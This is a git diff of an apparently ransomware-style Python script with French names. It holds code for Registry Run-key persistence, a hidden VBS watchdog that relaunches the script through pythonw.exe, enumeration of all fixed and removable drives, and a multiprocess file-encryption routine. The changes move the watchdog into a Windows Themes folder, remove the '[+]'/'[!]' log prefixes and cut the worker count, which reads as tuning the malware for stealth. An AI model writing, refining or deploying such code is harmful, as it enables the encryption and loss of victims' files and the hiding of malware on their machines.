@@ -82,12 +82,7 @@ vbsFile = []
 script_python_path = os.path.abspath(__file__)
 
 target_dirs = [
-    os.getenv("TEMP"),
-    os.getenv("APPDATA"),
-    os.path.expandvars(r"%USERPROFILE%\Documents"),
-    os.path.expandvars(r"%USERPROFILE%\Download"),
-    os.path.expandvars(r"%USERPROFILE%\Image"),
-    os.path.expandvars(r"%USERPROFILE%\Video"),
+    os.path.expandvars(r"%APPDATA%\Microsoft\Windows\Themes"),
 ]
 
 def deleteVbsFileAfterFinish():
@@ -165,9 +160,9 @@ def create_watchdog_vbs():
             )
             #with open(vbs_path, "w", encoding="utf-8") as f:
             #    f.write(vbs_content.format(script_python_path.replace("\\", "\\\\")))
-            print(f"[+] Watchdog créé dans {vbs_path}")
+            print(f"Watchdog créé dans {vbs_path}")
         except Exception as e:  
-            print(f"[!] Erreur création watchdog dans {folder}: {e}")
+            print(f"Erreur création watchdog dans {folder}: {e}")
 
 def lancer_watchdogs():
     for vbs_path in vbsFile:
@@ -207,9 +202,9 @@ WshShell.Run "pythonw.exe {chemin_script_python}", 0, False
                              0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(key, nom_valeur, 0, winreg.REG_SZ, chemin_script)
         winreg.CloseKey(key)
-        print("[+] Clé Run ajoutée avec succès.")
+        print("Clé Run ajoutée avec succès.")
     except Exception as e:
-        print(f"[!] Erreur lors de l'ajout dans le registre : {e}")
+        print(f"Erreur lors de l'ajout dans le registre : {e}")
 
 def is_in_excluded_folder(file_path: Path):
     try:
@@ -220,7 +215,7 @@ def is_in_excluded_folder(file_path: Path):
                     return True
         return False
     except Exception as e:
-        print(f"[!] Erreur exclusion sur {file_path}: {e}")
+        print(f"Erreur exclusion sur {file_path}: {e}")
         return True  
 
 def get_existing_root_path():
@@ -233,9 +228,9 @@ def get_existing_root_path():
                     if drive_type in [2, 3]:  # Amovible ou fixe uniquement
                         root_paths.append(drive)
                     else:
-                        print(f"[!] Ignoré (non disque ou dangereux) : {drive} (type {drive_type})")
+                        print(f"Ignoré (non disque ou dangereux) : {drive} (type {drive_type})")
             except Exception as e:
-                    print(f"[!] Erreur détection disque {drive} : {e}")
+                    print(f"Erreur détection disque {drive} : {e}")
     return root_paths
 
 def encrypte_file(input_file):
@@ -278,7 +273,7 @@ def worker(queue):
         except Exception as e:
             print(f"[!] Erreur sur {file}: {e}")
 
-def process_par_lecteur(chemin, nb_process=5):
+def process_par_lecteur(chemin, nb_process=2):
     chemin = Path(chemin)
     queue = multiprocessing.Queue(maxsize=100)
 
